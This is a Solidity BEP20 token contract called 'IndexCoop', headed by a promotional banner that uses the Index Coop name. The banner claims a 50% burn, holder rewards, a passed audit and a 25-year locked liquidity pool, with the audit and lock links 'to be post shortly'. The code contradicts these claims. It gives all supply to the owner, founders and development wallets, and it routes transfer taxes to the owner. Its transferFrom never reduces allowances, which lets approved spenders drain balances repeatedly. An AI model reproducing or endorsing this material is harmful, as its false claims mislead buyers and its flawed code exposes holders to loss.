// SPDX-License-Identifier: MIT
/*

██╗███╗░░██╗██████╗░███████╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██████╗░
██║████╗░██║██╔══██╗██╔════╝╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║██╔██╗██║██║░░██║█████╗░░░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║██████╔╝
██║██║╚████║██║░░██║██╔══╝░░░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═══╝░
██║██║░╚███║██████╔╝███████╗██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░░░░░
╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░░░░

🔶The Index Coop🔶 is a community-led initiative focused on making crypto investing simple, accessible,
and safe 🦉 $DPI $FLI $MVI $BED $DATA $INDEX
a Decentralized and Autonomous Asset Manager governed
maintained, and upgraded by INDEX token holders.

🔱 Supply = 50,000,000,000,000
🔥 50%  BURN 50,000,000,000,000
🎁-3% back to holders
🤝‍-1% back to Ecosystem Development
💧-3% back to LP Liquidity for a healthy pool
😸-4% to Marketing Charity .
🤝-2% Buyback
✅ Audit Done & Passed 💯 Link to be post shortly
🔐 Locked LP for 25 years Link to be post shortly

🚀 Telegram https://t.me/IndexCoopBSC
*/
pragma solidity ^0.8.8;

import './Rebase.sol';

contract RebaseSystem is IBEP20 {
  
    // common addresses
    address private owner;
    address private developmentPot;
    address private foundersPot;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "IndexCoop";
    string public override symbol = "Index";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint value);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address developmentAddress, address foundersAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        developmentPot = developmentAddress;
        foundersPot = foundersAddress;
        
        // split the tokens according to agreed upon percentages
        balances[developmentPot] =  totalSupply * 4 / 100;
        balances[foundersPot] = totalSupply * 44 / 100;
        
        balances[owner] = totalSupply * 52 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint taxTBD = value * 4 / 100;
        uint burnTBD = value * 1 / 100;
        uint valueAfterTaxAndBurn = value - taxTBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        balances[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}